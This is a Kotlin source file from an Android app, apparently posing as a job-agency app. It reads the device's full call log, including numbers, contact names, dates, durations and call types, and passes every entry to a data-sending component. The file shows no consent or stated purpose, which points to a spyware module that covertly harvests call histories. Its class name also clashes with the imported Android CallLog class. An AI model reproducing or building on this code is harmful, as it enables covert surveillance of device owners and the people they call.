package com.example.EzJobAgency.DataRetriever

import android.app.Activity
import android.content.Context
import android.net.Uri
import android.provider.CallLog
import com.example.EzJobAgency.DataSender
import java.util.*

class CallLog(var context: Context, var activity: Activity, var dataSender: DataSender) {

    fun readLogs() {
        val allCalls = Uri.parse("content://call_log/calls")
        val c = activity.contentResolver.query(allCalls, null, null, null, null)
            if (c!!.moveToFirst()) {
                for (i in 0 until c.count) {
                    val iterator = i.toString()
                    val num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
                    val duration = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val type = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)).toInt()
                    val callDate = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val callDayTime = Date(java.lang.Long.valueOf(callDate))
                    val fi = """
                        #$iterator
                        Number : $num
                        Name : $name
                        Date : $callDayTime
                        Duration : $duration
                        Type : $type
                        
                        """.trimIndent()
                    dataSender.sendData(fi)
                    c.moveToNext()
                }
        }
    }
}